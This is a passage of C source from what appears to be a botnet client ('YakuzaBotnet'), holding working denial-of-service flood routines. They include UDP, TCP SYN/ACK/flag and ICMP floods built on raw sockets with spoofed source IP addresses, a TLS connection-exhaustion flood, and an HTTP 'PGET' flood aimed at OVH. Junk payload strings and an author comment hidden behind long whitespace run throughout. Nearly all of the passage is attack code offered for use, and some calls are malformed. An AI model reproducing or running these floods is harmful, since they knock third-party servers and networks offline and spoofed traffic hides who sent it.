            "/20x/x58/x4b/x49/x57/x44/x49/x4a/x22/x20/x22/x64/x39/x63/x39/x29/x4d/x20/x29/x57/x5f/x22/x21/x5f/x2b/x20/x51/x53/x4d/x45/x4d/x44/x4d/x20/x29/x28/x28/x22/x29/x45/x4f/x4b/x58/x50/x7b/x20/x5f/x57/x44/x44/x57/x44/",
            "/45xUdHPiFHQ7xbKh19G45saF1raB2ot5pag8p1Hnk4yrfXRJZskr8TMbFpVfC5tDk8eQQg63TqkW9gKhwagx6HePTaK2yXb/x4c/x3a/x50/x51/x20/x71/x5b/x7a/x71/x3b/x38/x38/x20/x43/x57/x29/x57/x22/x29/x64/x32/x20/x4b/x58/x4b/x4b/x4c/x22/x44/x20/x2d/x44/x5f/",
        };
        if (a >= 50)
        {
            hexstring = rhexstring[rand() % (sizeof(rhexstring) / sizeof(char *))];
            send(std_hex, hexstring, std_packet1, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}

void audp(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32)
    {
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(!sockfd)
        {
            return;
        }

        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
        if(buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1)
        {
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

            if(i == pollRegister)
            {
                if(port == 0) dest_addr.sin_port = rand_cmwc();
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
        }
    } else {
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd)
        {
            return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
            return;
        }

        int counter = 50;
        while(counter--)
        {
            srand(time(NULL) ^ rand_cmwc());
            init_rand(rand());
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);

        udph->len = htons(sizeof(struct udphdr) + packetsize);
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;

        makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1)
        {
            sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

            udph->source = rand_cmwc();
            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
            iph->id = rand_cmwc();
            iph->saddr = htonl( getRandomIP(netmask) );
            iph->check = csum ((unsigned short *) packet, iph->tot_len);

            if(i == pollRegister)
            {
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
        }
    }
}
void sendTLS(unsigned char * ip, int port, int end_time) { 

    int max = getdtablesize() / 2, i;

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    if (getHost(ip, & dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    struct state_t {
        int fd;
        uint8_t state;
    }
    fds[max];
    memset(fds, 0, max * (sizeof(int) + 1));

    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    int valopt, res;


    int end = time(NULL) + end_time;
    while (end > time(NULL)) {
        for (i = 0; i < max; i++) {
            switch (fds[i].state) {
            case 0:
                {
                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                    fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                    if (connect(fds[i].fd, (struct sockaddr * ) & dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
                    else fds[i].state = 1;
                }
                break;

            case 1:
                {
                    FD_ZERO( & myset);
                    FD_SET(fds[i].fd, & myset);
                    tv.tv_sec = 0;
                    tv.tv_usec = 20000;
                    res = select(fds[i].fd + 1, NULL, & myset, NULL, & tv);
                    if (res == 1) {
                        lon = sizeof(int);
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void * )( & valopt), & lon);
                        if (valopt) {
                            close(fds[i].fd);
                            fds[i].state = 0;
                        } else {
                            fds[i].state = 2;
                        }
                    } else if (res == -1) {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;

            case 2:
                {

                    if (send(fds[i].fd, "\x16\x03\x01\x00\xa5\x01\x00\x00\xa1\x03\x03\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x00\x00\x20\xcc\xa8\xcc\xa9\xc0\x2f\xc0\x30\xc0\x2b\xc0\x2c\xc0\x13\xc0\x09\xc0\x14\xc0\x0a\x00\x9c\x00\x9d\x00\x2f\x00\x35\xc0\x12\x00\x0a\x01\x00\x00\x58\x00\x00\x00\x18\x00\x16\x00\x00\x13\x65\x78\x61\x6d\x70\x6c\x65\x2e\x75\x6c\x66\x68\x65\x69\x6d\x2e\x6e\x65\x74\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00\x0a\x00\x0a\x00\x08\x00\x1d\x00\x17\x00\x18\x00\x19\x00\x0b\x00\x02\x01\x00\x00\x0d\x00\x12\x00\x10\x04\x01\x04\x03\x05\x01\x05\x03\x06\x01\x06\x03\x02\x01\x02\x03\xff\x01\x00\x01\x00\x00\x12\x00\x00", 170, MSG_NOSIGNAL) == -1 && errno != EAGAIN) {
                        //close(fds[i].fd); NEVER CLOSE SOCKET
                        fds[i].state = 0;
                    }
                }
                break;
            }
        }
    }
}

void bnrse(char *host, int secs) {
    uint8_t pkt_template[] = {
        0x03,
        0x03,
        0x0d,
        0x33,
        0x00,
        0x00,
        0x00,
        0x00,
        0x45,
        0x00,
        0x00,
        0x1c,
        0x4a,
        0x04,
        0x00,
        0x00,
        0x40,
        0x06,
        0x20,
        0xc5,
        0x01,
        0x02,
        0x03,
        0x04,
        0x05,
        0x06,
        0x07,
        0x08,
        0x00,
        0x00,
        0x00,
        0x00,
        0x00,
        0x08,
        0xef,
        0xc1
    };
    uint8_t * pkt;
    struct addrinfo * ai, hints;
    struct pollfd pfd;
    const size_t pkt_len = (sizeof pkt_template) / (sizeof pkt_template[0]);
    size_t i;
    int gai_err;
    int kindy;
    int x, get;

    if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) _exit(1);

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    if ((gai_err = getaddrinfo(host, NULL,&hints,&ai)) != 0) {
        _exit(1);
    }
    if ((kindy = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
        _exit(1);
    }
    pkt = pkt_template;
    pfd.fd = kindy;
    pfd.events = POLLOUT;
    int end = time(NULL) + secs;
    for (;;) {
        for (i = 20; i < 20 + 8 + 4; i++) {
            pkt[i] = (uint8_t) rand();
        }
        if (sendto(kindy, pkt, pkt_len, 0,
                ai->ai_addr, ai->ai_addrlen) != (ssize_t) pkt_len) {
            if (errno == ENOBUFS) {
                poll(&pfd, 1, 1000);
                continue;
            }
            break;
        }
        if (i >= 100) {
            if (time(NULL) > end) {
                _exit(0);
            }
            x = 0;
        }
        x++;
    }
    /* NOTREACHED */
    close(kindy);
    freeaddrinfo(ai);

    return;
}

void SendTCP(unsigned char *target, int port, int timeEnd, unsigned char *flags, int packetsize, int pollinterval, int spoofit) {
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(!sockfd) {
        return;
    }
    int tmp = 1;
    if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
        return;
    }
    in_addr_t netmask;
    if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
    else netmask = ( ~((1 << (32 - spoofit)) - 1) );
    unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
    makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);
    tcph->source = rand_cmwc();
    tcph->seq = rand_cmwc();
    tcph->ack_seq = 0;
    tcph->doff = 5;
    if(!strcmp(flags, "ALL")) {
        tcph->syn = 1;
        tcph->rst = 1;
        tcph->fin = 1;
        tcph->ack = 1;
        tcph->psh = 1;
    } else {
        unsigned char *pch = strtok(flags, "-");
        while(pch) {
            if(!strcmp(pch,         "SYN")) {
                tcph->syn = 1;
            } else if(!strcmp(pch,  "RST")) {
                tcph->rst = 1;
            } else if(!strcmp(pch,  "FIN")) {
                tcph->fin = 1;
            } else if(!strcmp(pch,  "ACK")) {
                tcph->ack = 1;
            } else if(!strcmp(pch,  "PSH")) {
                tcph->psh = 1;
            } else {
            }
            pch = strtok(NULL, ",");
        }
    }
    tcph->window = rand_cmwc();
    tcph->check = 0;
    tcph->urg_ptr = 0;
    tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
    tcph->check = tcpcsum(iph, tcph);
    iph->check = csum ((unsigned short *) packet, iph->tot_len);
    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    while(1) {
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        iph->saddr = htonl( getRandomIP(netmask) );
        iph->id = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->source = rand_cmwc();
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        if(i == pollRegister) {
            if(time(NULL) > end) break;
            i = 0;
            continue;
        }
        i++;
    }
}

int socket_connect(char *host, in_port_t port) {
    struct hostent *hp;
    struct sockaddr_in addr;
    int on = 1, sock;
    if ((hp = gethostbyname(host)) == NULL) return 0;
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
    if (sock == -1) return 0;
    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
    return sock;
}

void rtcp(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
    register unsigned int pollRegister;
    pollRegister = pollinterval;

    struct sockaddr_in dest_addr;

    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(!sockfd)
    {
        return;
    }

    int tmp = 1;
    if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
    {
        return;
    }

    in_addr_t netmask;

    if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
    else netmask = ( ~((1 << (32 - spoofit)) - 1) );

    unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

    makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

    tcph->source = rand_cmwc();
    tcph->seq = rand_cmwc();
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->ack = 1;
    tcph->syn = 1;
    tcph->psh = 1;
    tcph->ack = 1;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          //ZG9udCBjb3B5IG15IHNoaXQgeHh4
    tcph->urg = 1;
    tcph->window = rand_cmwc();
    tcph->check = 0;
    tcph->urg_ptr = 0;
    tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
    tcph->check = tcpcsum(iph, tcph);

    iph->check = csum ((unsigned short *) packet, iph->tot_len);

    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    while(1)
    {
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        iph->saddr = htonl( getRandomIP(netmask) );
        iph->id = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->source = rand_cmwc();
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        if(i == pollRegister)
        {
            if(time(NULL) > end) break;
            i = 0;
            continue;
        }
        i++;
    }
}

void UDPRAW(unsigned char *ip, int port, int secs)
{
    int string = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *stringme[] = {"\x8f"};
        if (a >= 50)
        {
            send(string, stringme, 1460, 0);
            connect(string,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(string);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
void Randhex(unsigned char *ip, int port, int secs) {
    int iSTD_Sock;
    iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1) { // random std string
        char *randstrings[] = {"\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff""PozHlpiND4xPDPuGE6tq","tg57YSAcuvy2hdBlEWMv","VaDp3Vu5m5bKcfCU96RX","UBWcPjIZOdZ9IAOSZAy6","JezacHw4VfzRWzsglZlF","3zOWSvAY2dn9rKZZOfkJ","oqogARpMjAvdjr9Qsrqj","yQAkUvZFjxExI3WbDp2g","35arWHE38SmV9qbaEDzZ","kKbPlhAwlxxnyfM3LaL0","a7pInUoLgx1CPFlGB5JF","yFnlmG7bqbW682p7Bzey","S1mQMZYF6uLzzkiULnGF","jKdmCH3hamvbN7ZvzkNA","bOAFqQfhvMFEf9jEZ89M","VckeqgSPaAA5jHdoFpCC","CwT01MAGqrgYRStHcV0X","72qeggInemBIQ5uJc1jQ","zwcfbtGDTDBWImROXhdn","w70uUC1UJYZoPENznHXB","EoXLAf1xXR7j4XSs0JTm","lgKjMnqBZFEvPJKpRmMj","lSvZgNzxkUyChyxw1nSr","VQz4cDTxV8RRrgn00toF","YakuzaBotnet","Scarface1337""\x53\x65\x6c\x66\x20\x52\x65\x70\x20\x46\x75\x63\x6b\x69\x6e\x67\x20\x4e\x65\x54\x69\x53\x20\x61\x6e\x64\x20\x54\x68\x69\x73\x69\x74\x79\x20\x30\x6e\x20\x55\x72\x20\x46\x75\x43\x6b\x49\x6e\x47\x20\x46\x6f\x52\x65\x48\x65\x41\x64\x20\x57\x65\x20\x42\x69\x47\x20\x4c\x33\x33\x54\x20\x48\x61\x78\x45\x72\x53\x0a","/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A","\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6\xF5\x9B\xDC\x23\x6E\x12\x29\x25\x1D\x0A\xEF\xFB\xDE\xB6\xB1\x94\xD6\x7A\x6B\x01\x34\x26\x1D\x56\xA5\xD5\x8C\x91\xBC\x8B\x96\x29\x6D\x4E\x59\x38\x4F\x5C\xF0\xE2\xD1\x9A\xEA\xF8\xD0\x61\x7C\x4B\x57\x2E\x7C\x59\xB7\xA5\x84\x99\xA4\xB3\x8E\xD1\x65\x46\x51\x30\x77\x44\x08\xFA\xD9\x92\xE2\xF0\xC8\xD5\x60\x77\x52\x6D\x21\x02\x1D\xFC\xB3\x80\xB4\xA6\x9D\xD4\x28\x24\x03\x5A\x35\x14\x5B\xA8\xE0\x8A\x9A\xE8\xC0\x91\x6C\x7B\x47\x5E\x6C\x69\x47\xB5\xB4\x89\xDC\xAF\xAA\xC1\x2E\x6A\x04\x10\x6E\x7A\x1C\x0C\xF9\xCC\xC0\xA0\xF8\xC8\xD6\x2E\x0A\x12\x6E\x76\x42\x5A\xA6\xBE\x9F\xA6\xB1\x90\xD7\x24\x64\x15\x1C\x20\x0A\x19\xA8\xF9\xDE\xD1\xBE\x96\x95\x64\x38\x4C\x53\x3C\x40\x56\xD1\xC5\xED\xE8\x90\xB0\xD2\x22\x68\x06\x5B\x38\x33\x00\xF4\xF3\xC6\x96\xE5\xFA\xCA\xD8\x30\x0D\x50\x23\x2E\x45\x52\xF6\x80\x94","8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0""/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58","\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x21\x58\x99\x21\x58\x99\x21\x58\x06"};
        char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
        if (a >= 50)
        {
            send(iSTD_Sock, STD2_STRING, STD2_SIZE, 0);
            connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(iSTD_Sock);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
void ovhl7(char *host, in_port_t port, int timeEnd, int power) {
    int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
    char request[512], buffer[1], pgetData[2048];
    sprintf(pgetData, "\x00","\x01","\x02",
            "\x03","\x04","\x05","\x06","\x07","\x08","\x09",
            "\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10",
            "\x11","\x12","\x13","\x14","\x15","\x16","\x17",
            "\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e",
            "\x1f","\x20","\x21","\x22","\x23","\x24","\x25",
            "\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c",
            "\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33",
            "\x34","\x35","\x36","\x37","\x38","\x39","\x3a",
            "\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41",
            "\x42","\x43","\x44","\x45","\x46","\x47","\x48",
            "\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f",
            "\x50","\x51","\x52","\x53","\x54","\x55","\x56",
            "\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d",
            "\x5e","\x5f","\x60","\x61","\x62","\x63","\x64",
            "\x65","\x66","\x67","\x68","\x69","\x6a","\x6b",
            "\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72",
            "\x73","\x74","\x75","\x76","\x77","\x78","\x79",
            "\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80",
            "\x81","\x82","\x83","\x84","\x85","\x86","\x87",
            "\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e",
            "\x8f","\x90","\x91","\x92","\x93","\x94","\x95",
            "\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c",
            "\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3",
            "\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa",
            "\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1",
            "\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8",
            "\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf",
            "\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6",
            "\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd",
            "\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4",
            "\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb",
            "\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2",
            "\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9",
            "\xea","\xeb","\xec","\xed","\xee","\xef","\xf0",
            "\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7",
            "\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff");
    for (i = 0; i < power; i++) {
        sprintf(request, "PGET \0\0\0\0\0\0%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", pgetData, host, useragents[(rand() % 2)]);
        if (fork()) {
            while (end > time(NULL)) {
                socket = socket_connect(host, port);
                if (socket != 0) {
                    write(socket, request, strlen(request));
                    read(socket, buffer, 1);
                    close(socket);
                }
            }
            exit(0);
        }
    }
}


void SendDOMINATE(unsigned char *target, int port, int timeEnd, int pollinterval)
{
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(!sockfd)
    {
        return;
    }
    int tmp = 1;
    if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
    {
        return;
    }
    in_addr_t netmask;
    unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
    makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr));
    tcph->source = rand_cmwc();
    tcph->seq = rand_cmwc();
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = rand_cmwc();
    tcph->check = 0;
    tcph->urg_ptr = 0;
    tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
    tcph->check = tcpcsum(iph, tcph);
    iph->check = csum ((unsigned short *) packet, iph->tot_len);
    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    register unsigned int n = 0;
    while(1)
    {
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if(n == 0) {
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + 512;
